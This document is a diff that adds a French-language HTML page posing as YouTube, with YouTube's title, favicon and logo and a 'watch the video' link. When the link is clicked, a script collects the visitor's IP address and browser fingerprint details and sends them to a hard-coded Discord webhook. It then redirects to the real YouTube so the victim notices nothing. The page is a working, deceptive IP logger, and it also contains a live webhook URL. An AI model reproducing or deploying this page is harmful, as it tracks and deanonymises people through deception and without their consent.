@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>YouTube</title>
+<link rel="icon" href="https://www.youtube.com/favicon.ico">
+</head>
+<body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#fff;">
+
+<!-- FAUX LIEN : ressemble à YouTube -->
+<a href="#" id="fakeLink" style="display:flex;align-items:center;gap:10px;font-family:Arial;font-size:24px;text-decoration:none;color:#000;">
+  <img src="https://www.youtube.com/img/desktop/supported_browsers/dark/youtube-logo.svg" width="120" alt="YouTube">
+  Regarder la vidéo
+</a>
+
+<script>
+// ⚠️ METS TON WEBHOOK DISCORD ICI
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1571811746522464307/REyCSk0KWS3N8dkGV2BuIfly47n0G-81qVAGozbpTnQtypVZU6EdxeCeQu8TXwXJ6u1A";
+
+document.getElementById("fakeLink").addEventListener("click", async (e) => {
+  e.preventDefault();
+
+  // Récupération des données "possibles" depuis le navigateur
+  const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({ip: "inconnue"}));
+
+  const data = {
+    username: "Logger",
+    embeds: [{
+      title: "🖱️ Clic détecté !",
+      color: 16711680,
+      fields: [
+        { name: "IP", value: ip.ip || "inconnue", inline: true },
+        { name: "Navigateur", value: navigator.userAgent, inline: false },
+        { name: "Langue", value: navigator.language, inline: true },
+        { name: "Plateforme", value: navigator.platform, inline: true },
+        { name: "Écran", value: `${screen.width}x${screen.height}`, inline: true },
+        { name: "Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+        { name: "Cookies activés", value: navigator.cookieEnabled ? "Oui" : "Non", inline: true },
+        { name: "CPU (cœurs)", value: String(navigator.hardwareConcurrency || "?"), inline: true },
+        { name: "RAM (Go)", value: String(navigator.deviceMemory || "?"), inline: true },
+        { name: "Page précédente", value: document.referrer || "aucune", inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  // Envoi au webhook Discord (accepte les requêtes navigateur)
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  }).catch(console.error);
+
+  // Redirection vers le vrai YouTube pour faire croire que rien ne s'est passé
+  window.location.href = "https://www.youtube.com";
+});
+</script>
+
+</body>
+</html>
